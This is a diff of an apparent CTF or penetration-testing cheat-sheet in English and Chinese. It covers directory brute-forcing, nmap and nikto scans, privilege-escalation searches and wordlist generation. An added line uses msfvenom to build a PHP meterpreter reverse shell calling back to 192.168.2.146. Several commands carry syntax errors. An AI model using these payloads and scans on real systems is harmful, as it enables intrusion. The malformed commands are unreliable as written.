@@ -2,14 +2,14 @@ https://github.com/JohnHammond/ctf-katana
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
 https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6   // jwk crack learn
 
-export IP=127.0.0.1
+export $IP=127.0.0.1
 
 gobuster -u url -w /opt/directory-list-2.3=medium.txt  -x php ,sh,txt,cgi,html,js,css,py,bak,~
 
 nikto -h url | tee nikto.log
 
 nmap   -sC -sV oN  dir -v  IP/directory
-
+msfvenom -p php/meterpreter/reverse_tcpLHOST=192.168.2.146 LPORT=5555 R > test3.php  #msf 生成php shell 
 grep -Ri 
 grep -oE 用正则表达式搜索
 
@@ -23,9 +23,11 @@ ssh username@ipadderss -p port
 sudo -l
 
 find  / -user [用户名如 root] 2>/dev/null (查找该用户的所有文件)
+
 xxd
 
 find / -perm ug=rwx 2>/dev/null
+
 
 cewl url://ip/index.txt  wordlist.txt 将一个网页上的字符生成密码字典
 
